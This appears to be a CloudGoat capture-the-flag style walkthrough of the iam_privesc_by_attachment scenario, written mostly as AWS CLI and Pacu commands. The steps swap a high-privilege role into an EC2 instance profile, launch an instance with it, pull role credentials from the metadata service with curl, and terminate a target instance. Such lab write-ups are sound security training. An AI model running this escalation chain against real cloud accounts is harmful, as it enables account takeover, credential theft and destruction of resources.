Goal - Delete the EC2 instance "cg-super-critical-security-server."
```zsh
cloudgoat create iam_privesc_by_attachment

aws configure --profile kerrigan
aws sts get-caller-identity --profile kerrigan
#kerrigan

aws iam get-account-summary --profile kerrigan
aws iam get-user --profile kerrigan
aws s3 ls --profile kerrigan
aws --profile kerrigan iam list-user-policies --user-name kerrigan
aws --profile kerrigan iam list-attached-user-policies --user-name kerrigan
#access denied

aws iam list-instance-profiles --profile kerrigan
#meek-role

#available roles
aws iam list-roles --profile kerrigan #(data iam roles)
aws ec2 describe-instances --profile kerrigan #(data ec2 instances)
```

```zsh
pacu
import_keys kerrigan
set_regions us-east-1

run iam__enum_permissions
run lambda__enum
#nothing

run iam__enum_users_roles_policies_groups
#5 roles
data iam roles

run ec2__enum
data ec2
#1 instance "cgidkv42592a5z super-critical-security-server EC2 Instance"
data ec2 roles
#cg-ec2-meek-role-cgidkv42592a5z, cg-ec2-mighty-role-cgidkv42592a5z
#both assiciated with ec2.amazonaws.com
jq ".Instances[] | .PublicIpAddress" ec2
#44.201.9.171
```

Now that we have identified the 2 cg roles, and a cg instance, we need to see what each role allows us to do.
```zsh
#inline
aws --profile kerrigan iam list-attached-role-policies --role-name cg-ec2-meek-role-cgidkv42592a5z
#attached
aws --profile kerrigan iam list-role-policies --role-name cg-ec2-meek-role-cgidkv42592a5z 
#both access denied

#but we already konw meek profile role is attached to the ec2
#So we remove the meek profile role from the instance profile
aws --profile kerrigan iam remove-role-from-instance-profile --instance-profile-name cg-ec2-meek-instance-profile-cgidkv42592a5z --role-name cg-ec2-meek-role-cgidkv42592a5z

#now, add the mighty role to instance profile
aws --profile kerrigan iam add-role-to-instance-profile --instance-profile-name cg-ec2-meek-instance-profile-cgidkv42592a5z --role-name cg-ec2-mighty-role-cgidkv42592a5z
```

## Understanding the PrivEsc Vector
Direct enumeration of these roles fails with “Access Denied” errors. However, we can leverage a common AWS security misconfiguration: IAM role attachment to EC2 instances.

Since IAM roles cannot be directly attached to EC2 instances (they require Instance Profiles), we need to:
1. Create a new EC2 instance with an existing instance profile
2. Modify the instance profile to use the higher-privileged role
3. Use the EC2 instance to enumerate and exploit the elevated permissions
# Prequisites for ec2 instance creation
1. subnetId (data ec2 subnets/ aws ec2 describe-subnets)
2. security groupId config (data ec2 securityGroups)
3. ssh keypair creation
4. ImageId
5. ProfileArn
```zsh
aws --profile kerrigan ec2 describe-subnets
#the one with tags of cloudgoat - subnet-020cada3941415c39

aws --profile kerrigan ec2 describe-security-groups --output table
#sg-09c2c8045a3deddb1

aws --profile kerrigan ec2 create-key-pair --key-name mal --query 'KeyMaterial' --output text >mal.pem
chmod 600 mal.pem

aws --profile kerrigan ec2 describe-instances | grep -i imageId
#ami-062944a84867f2386

aws --profile kerrigan iam list-instance-profiles | grep -i arn
#arn:aws:iam::266877689244:instance-profile/cg-ec2-meek-instance-profile-cgidkv42592a5z 
```

Finally, create the new ec2 instance
```zsh
aws --profile kerrigan ec2 run-instances --region us-east-1 --image-id ami-062944a84867f2386 --instance-type t2.micro --iam-instance-profile Arn=arn:aws:iam::266877689244:instance-profile/cg-ec2-meek-instance-profile-cgidkv42592a5z --key-name mal --subnet-id subnet-020cada3941415c39 --security-group-ids sg-09c2c8045a3deddb1

#and so, we can now ssh into the public ip of the new ec2 instance
#Note, it does take some time for the ec2 instance to change states from "pending" to "running"
ssh -i mal.pem ubuntu@18.234.247.187

#Now, we can query the metadata service, and extract instance keys, or run commands directly through the ec2, after installing aws cli
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>

sudo apt-get update
sudo apt-get install awscli
aws configure --profile ad1
aws sts get-caller-identity

#Enumerate the ecalated privileges first
aws iam list-policies 
aws iam get-policy --policy-arn=arn:aws:iam::266877689244:policy/cg-ec2-mighty-policy
aws iam get-policy-version --policy-arn=arn:aws:iam::266877689244:policy/cg-ec2-mighty-policy --version-id v1
#policy analysis reveals that mighty role provides admin access to the aws account

#now, we just need to delete the super-critical instance
aws --profile ad1 ec2 describe-instances
aws ec2 terminate-instances --instance-ids --instance-id i-085e0c173e4324360 --profile ad1
```

Cleanup
```zsh
Delete ec2 instance created during privesc
aws ec2 terminate-instances --instance-ids [YOUR_EXPLOITATION_INSTANCE_ID] --region us-east-1 --profile init

cloudgoat destroy iam_privesc_by_attachment
```